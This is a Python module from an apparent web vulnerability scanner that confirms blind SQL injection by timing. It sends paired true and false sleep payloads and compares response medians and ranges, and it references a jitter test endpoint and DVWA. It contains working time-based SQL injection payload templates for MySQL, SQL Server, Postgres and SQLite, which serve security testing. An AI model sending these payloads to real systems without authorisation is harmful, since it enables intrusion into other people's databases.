"""Stage 2, the timing test. For sql injection that leaves no mark on the page.

Some injectable pages come back looking exactly the same whatever the query
returns. Errors get swallowed, the same template is rendered every time.
sqli_boolean has nothing to compare on a page like that, so it rejects it and a
real bug walks away clean. The clock is the only channel left.

So we ask the database to wait, and check whether the reply actually came back
late.

One slow reply proves nothing. Servers stall for all sorts of reasons that have
nothing to do with us. What this does instead is compare two payloads of the
same shape and the same length whose only difference is a condition, always true
in one and always false in the other. The sleep sits behind that condition, so
it is only reached when the condition holds. Both requests parse the same, weigh
the same and take the same path through the app. A consistent gap between them
has nothing left to explain it except the database evaluating the condition.

Two things have to hold before this confirms anything:

    the medians are apart by most of the delay we asked for, and
    the slowest false sample is still quicker than the fastest true one.

The second rule is the one that does the work. /jitter in the test app is
randomly slow about one request in six. That kind of slowness lands in both sets
of samples and makes their ranges overlap, so the rule fails. A real sleep never
overlaps, because every true sample waits and no false sample does.
"""
import statistics

from ..findings import Finding, Verdict
from ..probe import send

# how long we ask the database to wait. it has to sit well clear of ordinary
# slowness, and /jitter stalls for a whole second, so 2 leaves room to tell the
# two apart.
DELAY_SECONDS = 2

SAMPLES = 10

# how much of the delay we insist on actually seeing. under 1.0 because a
# request that got cut short is not proof of anything.
MIN_SHARE = 0.8

# A sleep in a where clause can be evaluated once per row, so asking for 2
# seconds against a table with five rows in it buys ten. The ordinary timeout is
# 10 seconds and DVWA's blind sql injection landed exactly on it: the payload
# worked, the server was busy sleeping, and the client hung up before the answer
# came back. So the timing test asks for a good deal longer than it thinks it
# needs.
TIMEOUT_HEADROOM = 8

# and because those requests can be slow, cap how long one point may take rather
# than multiplying a ten second request by twenty and walking away for an hour
SAMPLING_BUDGET_MS = 120_000


def _timeout_for(delay_seconds):
    return delay_seconds * TIMEOUT_HEADROOM + 5

# Payloads to try, one per database, in both AND and OR form. {cond} gets filled
# with a condition that is always true and then one that is always false, which
# is what guarantees the pair can only ever differ there.
#
# Both forms are needed because databases stop evaluating a condition as soon as
# the answer is settled. With AND, if the part before it is false the sleep is
# never reached. With OR, if the part before it is true the sleep is never
# reached. Which one works depends entirely on whether the value we started from
# matches a row, and we have no way of knowing that in advance.
#
# DVWA's blind sql injection is exactly this. The form field is empty so the
# crawler starts from "test", no user is called test, user_id = 'test' is false
# for every row, and every AND payload got short circuited away. The bug was
# real, the sleep worked when asked directly, and the scanner still called it
# clean. The OR form finds it.
TEMPLATES = [
    "' AND IF({cond},SLEEP({d}),0) -- ",                            # mysql, text
    "' OR IF({cond},SLEEP({d}),0) -- ",                             # mysql, text
    " AND IF({cond},SLEEP({d}),0)",                                 # mysql, number
    " OR IF({cond},SLEEP({d}),0)",                                  # mysql, number
    "'; IF ({cond}) WAITFOR DELAY '0:0:{d}' -- ",                   # sql server
    " AND (CASE WHEN {cond} THEN (SELECT 1 FROM pg_sleep({d})) ELSE 1 END)=1",  # postgres
    " AND (CASE WHEN {cond} THEN sleep({d}) ELSE 0 END)",           # sqlite
    " OR (CASE WHEN {cond} THEN sleep({d}) ELSE 0 END)",            # sqlite
]

# same length, so the two payloads built from a template come out identical
# apart from the condition itself
TRUE_COND = "1=1"
FALSE_COND = "1=2"


def looks_delayed(true_ms, false_ms, delay_seconds=DELAY_SECONDS):
    """Did the true payload really make the server wait? Returns (bool, stats).

    Plain arithmetic, no requests. Keeping it separate means the rules can be
    tried against made up samples, so the awkward cases can be built exactly
    instead of waiting for one to turn up during a scan.
    """
    if not true_ms or not false_ms:
        return False, {}

    true_median = statistics.median(true_ms)
    false_median = statistics.median(false_ms)
    gap = true_median - false_median
    separated = min(true_ms) > max(false_ms)
    wanted_ms = delay_seconds * 1000 * MIN_SHARE

    stats = {
        "samples": len(true_ms),
        "true_median_ms": round(true_median, 1),
        "false_median_ms": round(false_median, 1),
        "true_min_ms": round(min(true_ms), 1),
        "false_max_ms": round(max(false_ms), 1),
        "median_gap_ms": round(gap, 1),
        "delay_asked_ms": delay_seconds * 1000,
        "ranges_separated": separated,
    }
    return bool(gap >= wanted_ms and separated), stats


def _collect(client, point, true_payload, false_payload, count, timeout):
    """Take the samples, alternating, so anything that drifts hits both sets."""
    true_ms, false_ms = [], []
    for _ in range(count):
        true_ms.append(send(client, point, true_payload, timeout=timeout).elapsed_ms)
        false_ms.append(send(client, point, false_payload, timeout=timeout).elapsed_ms)
    return true_ms, false_ms


def validate(client, point, reason=None, delay_seconds=DELAY_SECONDS, samples=SAMPLES):
    base = point.value or "1"
    screen_ms = delay_seconds * 1000 * MIN_SHARE
    tried = []

    for template in TEMPLATES:
        true_payload = base + template.format(cond=TRUE_COND, d=delay_seconds)
        false_payload = base + template.format(cond=FALSE_COND, d=delay_seconds)

        timeout = _timeout_for(delay_seconds)

        try:
            # one cheap look before committing to twenty slow requests. a
            # payload the database never ran comes back at normal speed the
            # first time, and most of them never run, wrong dialect or no bug.
            first = send(client, point, true_payload, timeout=timeout)
            if first.elapsed_ms < screen_ms:
                tried.append({
                    "true_payload": true_payload,
                    "elapsed_ms": round(first.elapsed_ms, 1),
                    "result": "came back at normal speed",
                })
                continue

            # now we know what one costs, work out how many we can afford
            affordable = int(SAMPLING_BUDGET_MS / max(first.elapsed_ms, 1.0))
            take = max(5, min(samples, affordable))

            true_ms, false_ms = _collect(client, point, true_payload,
                                         false_payload, take, timeout)
        except Exception as e:
            return Finding("sqli", point, Verdict.UNCONFIRMED,
                           f"could not finish the timing test: {e}",
                           {"detector_reason": reason, "technique": "timing",
                            "attempts": tried})

        delayed, stats = looks_delayed(true_ms, false_ms, delay_seconds)
        proof = {
            "true_payload": true_payload,
            "false_payload": false_payload,
            **stats,
            "true_ms": [round(v, 1) for v in true_ms],
            "false_ms": [round(v, 1) for v in false_ms],
        }

        if delayed:
            return Finding(
                "sqli", point, Verdict.CONFIRMED,
                f"true condition took {stats['median_gap_ms']:.0f} ms longer than "
                f"false, every time, over {take} samples each",
                {"detector_reason": reason, "technique": "timing", "proof": proof},
            )

        # something here is slow, but it is not the condition doing it. keep the
        # numbers and carry on, another dialect may still be the right one.
        proof["result"] = "slow, but not consistently tied to the condition"
        tried.append(proof)

    return Finding("sqli", point, Verdict.REJECTED,
                   f"none of the {len(TEMPLATES)} timing payloads made the server "
                   f"wait on the true condition only",
                   {"detector_reason": reason, "technique": "timing",
                    "attempts": tried})
